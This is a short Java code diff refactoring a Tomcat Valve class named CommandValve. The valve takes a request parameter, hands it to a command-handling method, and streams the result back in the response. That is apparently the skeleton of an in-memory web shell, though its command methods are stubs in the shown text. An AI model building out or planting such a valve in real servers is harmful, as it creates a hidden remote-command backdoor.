@@ -15,20 +15,12 @@ import java.io.InputStream;
 public class CommandValve implements Valve {
     private static String paramName;
 
-    private String getParam(String param) {
-        return param;
-    }
-
-    private InputStream getInputStream(String cmd) throws Exception {
-        return null;
-    }
-
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
-        String cmd = getParam(request.getParameter(paramName));
         try {
-            if (cmd != null) {
-                InputStream inputStream = getInputStream(cmd);
+            String param = getParam(request.getParameter(paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = response.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
@@ -37,10 +29,18 @@ public class CommandValve implements Valve {
                 }
                 return;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         this.getNext().invoke(request, response);
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String cmd) throws Exception {
+        return null;
     }
 
     protected Valve next;
